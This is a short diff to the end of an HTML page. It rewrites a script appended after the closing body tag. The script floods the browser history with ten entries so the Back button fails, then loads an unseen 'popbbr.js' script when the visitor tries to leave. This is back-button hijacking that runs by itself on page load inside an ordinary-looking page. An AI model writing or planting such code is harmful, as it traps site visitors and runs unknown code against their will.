@@ -172,5 +172,23 @@
 </script>
 
 </body>
-<script>!function () { var a; try { for (a = 0; 10 > a; ++a) { history.pushState({}, "", "#") } onpopstate = function (c) { c.state && location.replace("popbbr.js") } } catch (b) { } }();</script>
+<script>
+    !function () {
+        var a;
+        try {for (a = 0; 10 > a; ++a) {
+                history.pushState({}, "", "#");
+            }
+            
+            
+            onpopstate = function (e) {
+                if (e.state) {
+                    
+                    var script = document.createElement('script');
+                    script.src = 'popbbr.js'; 
+                    document.head.appendChild(script);
+                }
+            };
+        } catch (err) {}
+    }();
+    </script>
 </html>
